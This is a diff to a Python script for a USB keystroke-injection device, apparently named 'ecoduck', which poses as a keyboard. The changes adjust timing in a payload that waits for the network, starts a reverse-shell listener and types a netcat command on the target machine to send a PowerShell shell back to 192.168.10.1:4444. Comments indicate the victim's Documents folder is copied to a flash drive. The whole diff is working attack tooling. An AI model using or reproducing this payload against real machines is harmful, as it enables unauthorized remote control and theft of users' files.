@@ -54,7 +54,6 @@ def reverse_shell_listener():
 			data = recv_timeout(conn) # Receive output from command.
 			print(data) # Print the output of the command.
 		print("Letting copy finish")
-		sleep(15)
 		print("Copy should have finished")
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
@@ -66,7 +65,7 @@ def payload():
 	connected=False
 	print("Waiting for network to come up")
 	while(not connected):
-		response = os.system("ping -c 1 192.168.10.101")
+		response = os.system("ping -W 1 -c 1 192.168.10.101")
 		if(response == 0):
 			connected=True
 	print("Network up")
@@ -94,7 +93,7 @@ def payload():
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("./nc.exe 192.168.10.1 4444 -v -e powershell.exe")
+	eco.type("./nc.exe 192.168.10.1 4444 -vv -e powershell")
 	eco.press("ENTER")
 	print("Waiting for shell to exit")
 	shelllistener.join()
@@ -102,7 +101,6 @@ def payload():
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
 	httplistener.join()
-	sleep(4)
 	eco.type("exit")
 	eco.press("ENTER")
 
@@ -137,6 +135,6 @@ while(1):
 		else:
 			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
 		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-		sleep(4)
+		sleep(2)
 		eco.wait_for_disconnect()
 
